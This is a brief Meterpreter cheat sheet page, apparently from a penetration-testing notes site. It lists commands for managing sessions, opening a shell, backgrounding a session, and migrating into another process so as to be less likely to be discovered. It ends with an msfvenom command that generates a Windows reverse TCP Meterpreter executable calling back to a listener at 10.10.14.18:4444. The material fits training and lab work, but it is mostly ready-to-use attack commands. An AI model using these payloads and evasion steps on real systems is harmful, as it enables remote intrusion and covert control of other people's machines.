---
layout: default
title: METERPRETER
parent: CHEATSHEETS
has_children: true
has_toc: false
---

{% include toc.html %}

## List sessions
```
sessions
```

## Open a shell
```
meterpreter> shell                  // Open a shell
C:\WINDOWS\> exit                   // Exit shell back to Meterpreter
```

## Background session
So you can run something else, such as local_exploit_suggester:
```
meterpreter> background
```

## Return to existing meterpreter session
```
sessions -i 1
```

## Migrate into another process
Move to a more stable process that has less chance of being discovered or closed. List the processes and find the pid to migrate to:
```
meterpreter> ps                     // List processes (alternative: shell > tasklist /v > exit)
meterpreter> migrate <pid>          // Migrate into target process
```

On Windows, migrating to `explorer.exe` will show up in `ProcessExplorer`. For example, opening a command prompt and pinging another machine will be visible in `ProcessExplorer`.

## Windows Shells
```
msfvenom -p windows/x64/meterpreter_reverse_tcp --platform windows -f exe -a x64  LHOST=10.10.14.18 LPORT=4444 -o metrev.exe
```